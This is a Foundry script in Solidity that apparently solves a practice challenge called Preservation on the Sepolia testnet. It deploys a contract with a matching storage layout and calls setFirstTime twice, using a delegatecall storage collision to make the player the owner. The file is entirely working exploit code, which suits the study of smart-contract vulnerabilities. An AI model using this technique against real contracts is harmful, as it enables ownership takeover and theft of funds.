// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {HelperConfig} from "./HelperConfig.s.sol";
import {Preservation} from "../src/Preservation.sol";

contract PreservationHacker {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 _time) external {
        owner = address(uint160(_time));
    }
}

contract HackPreservationScript is Script {
    function run() public {
        HelperConfig helperConfig = new HelperConfig();
        Preservation preservation = Preservation(0x36bd7Fa7E2ebcBC4F45E77BB2Aa2Ea88B77F155F);
        address player = helperConfig.getBasicSepoliaConfig().account;
        vm.startBroadcast();
        PreservationHacker preservationHacker = new PreservationHacker();
        uint256 fakeTime = uint256(uint160(address(preservationHacker)));
        preservation.setFirstTime(fakeTime);
        // timeZone1Library is now pointing to preservationHacker
        preservation.setFirstTime(uint256(uint160(player)));
        console.log("Owner is now: ", preservation.owner());
    }
}
